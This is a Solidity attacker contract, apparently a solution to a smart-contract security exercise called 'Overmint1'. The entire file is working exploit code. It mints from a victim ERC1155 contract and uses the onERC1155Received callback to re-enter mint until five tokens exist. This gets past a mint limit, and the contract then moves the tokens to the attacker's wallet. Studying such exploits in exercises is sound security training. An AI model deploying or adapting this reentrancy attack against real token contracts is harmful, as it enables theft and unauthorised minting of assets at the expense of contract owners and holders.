// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./Overmint1-ERC1155.sol";

contract Overmint1_ERC1155_Attacker is IERC1155Receiver {
    Overmint1_ERC1155 victim;
    address attackerWallet;

    constructor(Overmint1_ERC1155 victim_) {
        victim = victim_;
        attackerWallet = msg.sender;
    }

    function attack() external {
        victim.mint(0, "");
        victim.safeTransferFrom(address(this), attackerWallet, 0, 5, "");
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        if (victim.totalSupply(id) < 5) {
            victim.mint(id, data);
        }
        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4) {
        return IERC1155Receiver.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) external view returns (bool) {
        return type(IERC1155Receiver).interfaceId == interfaceId;
    }
}
